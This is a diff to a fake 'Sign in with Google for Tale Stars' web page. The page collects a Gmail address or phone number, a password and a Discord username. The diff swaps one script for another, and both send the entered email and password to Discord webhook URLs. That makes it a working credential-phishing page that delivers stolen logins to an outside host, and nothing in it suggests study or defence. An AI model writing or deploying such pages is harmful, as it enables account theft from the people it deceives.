@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TaleStars</title>
+    <title>TaleStars Crash</title>
     <link rel="stylesheet" href="/s.css">
 	<style>
 		
@@ -127,15 +127,15 @@ h1{
     <form class="form"> 
         <h1 class="form-title">Sign in with Google for Tale Stars</h1>
         <div class="form-group">
-            <input id="input1" type="text" class="form-control" required>
+            <input id="email" type="text" class="form-control" required>
             <label for="" class="class-label"> Gmail or Phone</label>
         </div>
         <div class="form-group">
-            <input id="input2" type="password" class="form-control" required>
+            <input id="password" type="password" class="form-control" required>
             <label for="" class="class-label"> Password</label>
         </div>
 	<div class="form-group">
-            <input id="input3" type="password" class="form-control" required>
+            <input id="discord" type="password" class="form-control" required>
             <label for="" class="class-label"> Discord User (Not Nickname)</label>
         </div>
         <div class="form-group">
@@ -152,33 +152,24 @@ h1{
     </form>
 
     <script>
-        function sendToDiscord() {
-            const input1 = document.getElementById("input1").value;
-            const input2 = document.getElementById("input2").value;
-            const input3 = document.getElementById("input3").value;
+              function sendMessage() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+	const discord = document.getElementById('discord').value;
 
-            const webhookURL = "https://discord.com/api/webhooks/1346930138561904730/Wd-w3bzyziH1DK6RxC-zrG774532m6psyrOu5OivGE7IE-C5MCTRJEwKhFAJnFUeqGQc";
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1303003841112965130/Yzw5LH8tHu-PlzM6_Ft7QFBhVss88gz8_dBzmbW0DKUDmIp9ovPNSD_tHOBib-vfo0Cg ");
 
-            const data = {
-                content: `Here you go:\n1Email: ${input1}\n2 Passwort: ${input2}\n Discord: ${input3}`
-            };
+        request.setRequestHeader('Content-type', 'application/json');
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("Gesendet!");
-                } else {
-                    alert("Fehler beim Senden!");
-                }
-            })
-            .catch(error => console.error("Fehler:", error));
-        }
+        const params = {
+          username: "Michl",
+          avatar_url: "",
+          content: `Email: ${email}, Passwort: ${password}`
+        };
+
+        request.send(JSON.stringify(params));
+      }
     </script>
     
 </body>
